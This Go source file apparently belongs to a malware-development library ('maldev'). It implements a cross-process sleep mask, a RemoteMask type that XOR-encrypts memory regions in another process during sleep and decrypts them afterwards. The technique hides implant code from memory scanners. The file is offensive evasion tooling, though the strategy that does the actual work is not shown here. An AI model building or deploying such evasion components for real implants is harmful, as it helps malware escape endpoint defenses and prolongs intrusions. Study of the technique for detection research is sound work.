package sleepmask

import (
	"context"
	"crypto/rand"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/cleanup/memory"
)

// RemoteRegion identifies a memory range inside another process.
// Handle must carry at least PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// | PROCESS_VM_READ.
type RemoteRegion struct {
	Handle uintptr // windows.Handle on Windows; opaque uintptr for cross-platform compile
	Addr   uintptr
	Size   uintptr
}

// RemoteStrategy is the cross-process analog of Strategy. Cycle receives
// RemoteRegions and uses VirtualProtectEx / ReadProcessMemory /
// WriteProcessMemory instead of VirtualProtect + in-place writes.
type RemoteStrategy interface {
	Cycle(ctx context.Context, regions []RemoteRegion, cipher Cipher, key []byte, d time.Duration) error
}

// RemoteMask is the cross-process Mask.
type RemoteMask struct {
	regions  []RemoteRegion
	cipher   Cipher
	strategy RemoteStrategy
}

// NewRemote builds a RemoteMask over the given remote regions.
func NewRemote(regions ...RemoteRegion) *RemoteMask {
	return &RemoteMask{
		regions:  regions,
		cipher:   NewXORCipher(),
		strategy: &RemoteInlineStrategy{},
	}
}

func (m *RemoteMask) WithCipher(c Cipher) *RemoteMask {
	if c == nil {
		c = NewXORCipher()
	}
	m.cipher = c
	return m
}

func (m *RemoteMask) WithStrategy(s RemoteStrategy) *RemoteMask {
	if s == nil {
		s = &RemoteInlineStrategy{}
	}
	m.strategy = s
	return m
}

// Sleep runs one encrypt → wait → decrypt cycle on the remote regions.
// Semantics mirror Mask.Sleep.
func (m *RemoteMask) Sleep(ctx context.Context, d time.Duration) error {
	if len(m.regions) == 0 || d <= 0 {
		return nil
	}
	key := make([]byte, m.cipher.KeySize())
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("sleepmask/remote: key generation: %w", err)
	}
	defer memory.SecureZero(key)
	return m.strategy.Cycle(ctx, m.regions, m.cipher, key, d)
}
